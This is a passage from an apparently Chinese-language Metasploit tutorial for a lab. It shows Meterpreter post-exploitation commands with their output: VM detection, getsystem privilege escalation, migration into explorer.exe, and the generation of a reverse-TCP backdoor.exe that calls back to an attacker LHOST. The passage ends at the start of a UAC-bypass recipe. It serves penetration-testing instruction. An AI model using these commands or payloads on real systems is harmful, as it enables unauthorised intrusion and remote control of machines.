
## 如何工作...

现在，让我们使用一个简单的后渗透模块，看看它是如何工作的。

- 1. 我们将首先使用 Windows Gather 虚拟环境检测 后渗透收集模块 来确定目标是否在虚拟环境中运行，如果是，则检测其运行的超visor类型：

```
msf exploit(psexec) > use post/windows/gather/checkvm
msf post(checkvm) > show options
```

模块选项 (post/windows/gather/checkvm):

| 名称 | 当前设置 | 必需 | 描述 |
| ---- | --------------- | -------- | ----------- |
| SESSION |  | yes | 在该模块上运行的会话。 |

- 2. 在运行模块之前，我们应始终检查可用选项，不仅为了验证必需选项，还为了根据目标或需求自定义选项。或者，在使用简单模块时，我们可以简单地使用 show missing 命令来显示缺失的选项：

```
msf post(checkvm) > show missing
```

模块选项 (post/windows/gather/checkvm):

| 名称 | 当前设置 | 必需 | 描述 |
| ---- | --------------- | -------- | ----------- |
| SESSION |  | yes | 在该模块上运行的会话。 |

- 3. 通过运行该模块，我们可以看到它能够确定目标正在虚拟机上运行，并检测到超visor为 VMware：

```
msf post(checkvm) > set SESSION 1
SESSION => 1
msf post(checkvm) > run

[*] Checking if VAGRANT-2008R2 is a Virtual Machine
....
[+] This is a VMware Virtual Machine
[*] Post module execution completed
msf post(checkvm) > Privilege escalation and process migration
```

在本教程中，我们将重点介绍 Meterpreter 的两个非常有用的命令。第一个用于权限提升。该命令用于提升目标系统上的权限/授权。我们可能以权限较低的用户身份入侵系统以执行任务，因此我们可以将权限提升到系统管理员，以便在不中断的情况下执行我们的任务。第二个命令用于进程迁移。该命令用于在不写入磁盘的情况下从一个进程迁移到另一个进程。

## 如何操作...

要提升我们的权限，Meterpreter 为我们提供了 getsystem 命令。该命令会自动寻找各种可能的技术，通过这些技术可以将用户权限提升到更高级别。让我们分析 getsystem 命令使用的不同技术：

```
meterpreter > getsystem -h
Usage: getsystem [options]

Attempt to elevate your privilege to that of local system.

OPTIONS:

    -h      Help Banner.
    -t <opt> The technique to use. (Default to '0').
            0 : All techniques available
            1 : Named Pipe Impersonation (In Memory /Admin)
            2 : Named Pipe Impersonation (Dropper /Admin)
            3 : Token Duplication (In Memory/Admin)
```

## 如何工作...

`getsystem` 命令尝试在目标上提升权限有三种不同的技术。默认值 0 会尝试所有列出的技术，除非成功尝试。让我们快速了解一下这些提升技术。

**named pipe** 是一种机制，使应用程序能够在本地或远程进行进程间通信。创建管道的应用程序称为管道服务器，而连接到管道的应用程序称为管道客户端。**Impersonation** 是线程以与拥有该线程的进程不同的安全上下文执行的能力。模拟使服务器线程能够代表客户端执行操作，但仅限于客户端的安全上下文的限制。当客户端的权限高于服务器时就会出现问题。这种情况会造成一种特权提升攻击，称为 **named pipe impersonation escalation attack。**

现在我们已经了解了 `getsystem` 命令使用的各种提升技术，下一步将是在目标上执行该命令，看看会发生什么。首先，我们将使用 `getuid` 命令检查当前用户 ID，然后使用 `getsystem` 命令尝试提升我们的权限：

```
meterpreter > getuid
Server username: IE11WIN7\IEUser
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation
(In Memory/Admin)).
meterpreter >
```

正如你所见，以前我们是一个权限较低的用户，在使用 `getsystem` 命令后，我们将权限提升到了系统。

接下来我们要讨论的重要 Meterpreter 命令是 `migrate` 命令。我们在之前的章节中使用过它，但让我们再多谈一点。该命令用于从一个进程上下文迁移到另一个进程上下文，这在当前入侵的进程可能崩溃的情况下会很有帮助。例如，如果我们使用浏览器漏洞渗透系统，浏览器在利用后可能会挂起，用户可能会关闭它。因此，迁移到稳定的系统进程可以帮助我们顺利进行渗透测试。我们可以使用进程名称或 ID 迁移到任何其他活动进程。

ps 命令可用于识别所有活动进程及其名称和 ID。例如，如果 explorer.exe 的 ID 为 2804，我们可以通过执行以下命令迁移到 explorer.exe：

```
meterpreter > migrate 2804
[*] Migrating from 3072 to 2804...
[*] Migration completed successfully.
meterpreter >
```

或者，在使用 AutoRunScript 自动化 Meterpreter 脚本时，我们可以简单地使用进程名称：

```
meterpreter > migrate -N explorer.exe
[*] Migrating from 1232 to 2804...
[*] Migration completed successfully.
meterpreter >
```

这两个 Meterpreter 命令非常方便，在渗透测试期间经常使用。它们的简单性和高生产率使其成为最佳选择。

## 绕过 UAC

Microsoft User Account Control (UAC) 是一个使用强制完整性控制 (MIC) 来隔离具有不同权限的运行进程的组件，旨在提高 Windows 的安全性。它试图通过将应用程序软件限制为标准用户权限并提示管理员增加或提升这些权限来实现这一目标。尽管仍在使用，但 UAC 本质上是损坏的，可以被轻易击败。

有关如何击败 UAC 的更多信息，请参阅可在 https://github.com/hfiref0x/UACME 获取的 UACMe 项目。

## 准备工作

对于本教程，我们将针对 Windows 7 机器。为此，我们需要将虚拟机的网络配置更改为 NAT，以便我们可以从 Kali Linux 机器访问目标。

然后，为了破坏目标，我们将创建一个简单的后门，将其复制到目标以获取 Meterpreter 会话。

- 1. 要生成后门，我们将使用 Windows Meterpreter 反向 TCP 有效载荷和 `msfconsole` 内的 `generate` 命令来生成我们的有效载荷。在使用 `generate` 命令之前，让我们先使用 `-h` 查看可用选项：

```
msf > use payload/windows/meterpreter/reverse_tcp
msf payload(reverse_tcp) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf payload(reverse_tcp) > generate -h
Usage: generate [options]

Generates a payload.

OPTIONS:
```
- -E 强制编码。
- -b <opt> 避免的字符列表：
- '\x00\xff'
- -e <opt> 要使用的编码器模块名称。
- -f <opt> 输出文件名（否则为 stdout）
- -h 帮助横幅。
- -i <opt> 编码迭代次数。
- -k 保持模板可执行文件功能正常。
- -o <opt> VAR=VAL 格式的逗号分隔选项列表。
- -p <opt> 输出的平台。
- -s <opt> NOP sled 长度。
- -t <opt> 输出格式：

```
msf payload(reverse_tcp) >
```
- 2. 在使用 LHOST 选项设置监听地址并查看 `generate` 命令的可用选项后，我们将使用 -t 选项指定输出格式，在本例中为 exe，然后使用 -f 选项指定输出文件名：

```
msf payload(reverse_tcp) > generate -t exe -f backdoor.exe
[*] Writing 73802 bytes to backdoor.exe...
msf payload(reverse_tcp) >
```
